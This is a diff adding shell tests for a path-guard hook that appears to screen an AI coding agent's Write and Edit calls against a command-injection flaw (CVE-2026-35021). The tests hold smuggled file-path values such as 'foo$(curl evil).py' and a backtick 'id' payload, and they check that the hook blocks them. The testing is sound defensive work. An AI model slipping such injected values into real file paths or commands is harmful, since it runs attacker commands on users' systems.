@@ -75,4 +75,27 @@ OUT=$(echo "$INPUT" | bash "$HOOK" 2>/dev/null)
 [ -z "$OUT" ] && pass || fail "expected silent on Bash, got: $OUT"
 rm -rf "$PROJ"
 
+# v2.6.85: CVE-2026-35021 — command substitution in file path
+# Use python to build the JSON so $() / backtick survive shell quoting unmangled.
+begin_test "path-guard: blocks file path with \$() (CVE-2026-35021)"
+PROJ=$(mktemp -d)
+INPUT=$(python3 -c "import json,sys; print(json.dumps({'tool_name':'Write','tool_input':{'file_path':sys.argv[1]+'/foo\$(curl evil).py','content':'x'},'cwd':sys.argv[1]}))" "$PROJ")
+OUT=$(printf '%s' "$INPUT" | bash "$HOOK" 2>&1)
+echo "$OUT" | grep -qi "command substitution" && pass || fail "no CVE-2026-35021 block: $OUT"
+rm -rf "$PROJ"
+
+begin_test "path-guard: blocks file path with backtick (CVE-2026-35021)"
+PROJ=$(mktemp -d)
+INPUT=$(python3 -c "import json,sys; print(json.dumps({'tool_name':'Edit','tool_input':{'file_path':sys.argv[1]+'/foo\`id\`.py'},'cwd':sys.argv[1]}))" "$PROJ")
+OUT=$(printf '%s' "$INPUT" | bash "$HOOK" 2>&1)
+echo "$OUT" | grep -qi "command substitution" && pass || fail "no backtick block: $OUT"
+rm -rf "$PROJ"
+
+begin_test "path-guard: allows benign file path"
+PROJ=$(mktemp -d)
+INPUT=$(printf '{"tool_name":"Write","tool_input":{"file_path":"%s/src/foo.py","content":"x"},"cwd":"%s"}' "$PROJ" "$PROJ")
+OUT=$(echo "$INPUT" | bash "$HOOK" 2>&1)
+echo "$OUT" | grep -qi "command substitution" && fail "false positive: $OUT" || pass
+rm -rf "$PROJ"
+
 report
